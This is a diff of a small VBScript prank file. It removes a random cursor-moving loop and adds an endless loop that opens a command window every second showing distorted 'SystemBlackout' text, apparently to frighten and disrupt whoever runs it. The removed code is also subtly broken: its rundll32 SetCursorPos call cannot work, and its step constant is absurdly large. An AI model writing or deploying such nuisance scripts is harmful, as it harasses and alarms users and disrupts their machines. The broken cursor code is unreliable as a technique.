@@ -1,23 +1,6 @@
 Set objShell = CreateObject("WScript.Shell")
 
-' Define the screen boundaries
-Const screenWidth = 50 ' Update with your screen width
-Const screenHeight = 50 ' Update with your screen height
-
-' Define the maximum number of steps to take
-Const maxSteps = 1000000000000000000000000000000000000000000000000000000000000000 ' Adjust as needed
-
-' Generate random movements
-Randomize
-
-For i = 1 To maxSteps
-    ' Generate random coordinates
-    x = Int((screenWidth - 1) * Rnd + 1)
-    y = Int((screenHeight - 1) * Rnd + 1)
-    
-    ' Move the cursor
-    objShell.Run "rundll32 user32.dll,SetCursorPos " & x & "," & y, 0, False
-    
-    ' Pause for a short duration
-    WScript.Sleep 0 ' Adjust as needed
-Next
+Do While True
+    objShell.Run "cmd /c echo S̴̛̫̲͇̣̭͙͆̉̂̾̑́̔̓͝y̶̹̙̺͕͎̘̮̎̿́̐̆̓̚̕̚͜ͅs̸̹͔͆t̸͈͔̫͍̅̔͒̄͊̊e̴̝͚̲͙̠̥͊̈́̓̆̕̚͜͝m̸̻͙͈̮̤̫̝̥̍͐̄̉͒͂̂͛̄͘͜͜B̶̮͔̖̪̗̖͋̌͒͌̕ļ̶͔͍͚̹̹͍̠̝́͊̃̊̃ą̵̨͖̞̼͖̳̠̝͊c̷̬̤̩̻̙͑͂̇k̶̡͈̫͈̻̝͋͂̏̂͆̌̈́̾͠ó̷̗̠̠̯̯̣̚͜u̸͓̭̠͎̭͊t̷̟͖̪͚̙̞͆͂̉͝"
+    WScript.Sleep 1000 ' Pause for 1 second
+Loop
